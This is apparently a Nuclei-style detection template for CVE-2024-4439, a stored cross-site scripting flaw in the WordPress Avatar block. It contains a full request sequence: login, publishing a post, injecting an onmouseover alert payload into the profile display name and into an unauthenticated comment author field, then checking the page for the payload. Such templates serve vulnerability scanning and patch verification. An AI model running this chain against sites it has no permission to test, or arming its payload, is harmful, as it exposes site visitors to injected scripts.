http:
- extractors:
  - group: 1
    internal: true
    name: userid
    part: body_2
    regex:
    - user_id=(\d+)
    type: regex
  - group: 2
    internal: true
    name: logout_nonce
    part: body_2
    regex:
    - action=logout&(.*);\_wpnonce=(.{10})
    type: regex
  - group: 1
    internal: true
    name: postid
    part: body_3
    regex:
    - post=(\d+)
    type: regex
  - group: 1
    internal: true
    name: post_nonce
    part: body_3
    regex:
    - createNonceMiddleware\(\s"(.*)\"\s\)
    type: regex
  - group: 1
    internal: true
    name: profile_nonce
    part: body_5
    regex:
    - name=\"\_wpnonce\"\svalue="(.{10})\"\s
    type: regex
  host-redirects: true
  matchers:
  - part: body_9
    type: word
    words:
    - aria-label="(" onmouseover=alert(document.domain);
  - part: header_9
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /wp-admin/post-new.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /?rest_route=/wp/v2/posts/{{postid}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    X-HTTP-Method-Override: PUT

    X-WP-Nonce: {{post_nonce}}


    {"id":{{postid}},"title":"CVE-2024-4439","content":"<!-- wp:avatar {\"isLink\":true,\"linkTarget\":\"_blank\"}
    /-->","status":"publish"}

    '
  - 'GET /wp-admin/profile.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/profile.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _wpnonce={{profile_nonce}}&first_name=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&last_name=&nickname=admin&display_name=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&email=admin%40gmail.com&action=update&user_id={{userid}}&submit=Update+Profile

    '
  - 'GET wp-login.php?action=logout&_wpnonce={{logout_nonce}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-comments-post.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    comment=Unauthenticated+Comment&author=%22+onmouseover%3Dalert%28document.domain%29%3B+%2F%2F&email=example%40gmail.com&url=example.com&submit=Post+Comment&comment_post_ID={{postid}}

    '
  - 'GET /?p={{postid}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4439
info:
  author: nqdung2002
  classification:
    cve-id: CVE-2024-4439
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-80
    epss-percentile: 0.99612
    epss-score: 0.91018
  description: 'WordPress Core is vulnerable to Stored Cross-Site Scripting via user
    display names in the Avatar block in various versions up to 6.5.2 due to insufficient
    output escaping on the display name.

    '
  impact: 'This makes it possible for authenticated attackers, with contributor-level
    access and above, to inject arbitrary web scripts in pages that will execute whenever
    a user accesses an injected page. In addition, it also makes it possible for unauthenticated
    attackers to inject arbitrary web scripts in pages that have the comment block
    present and display the comment author''s avatar.

    '
  metadata:
    framework: wordpress
    max-request: 10
  name: WordPress Core <6.5.2 - Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4439
  - https://www.cvedetails.com/cve/CVE-2024-4439/
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: high
  tags: wpscan,xss,wp,wordpress,footnote,sxss,post,vuln
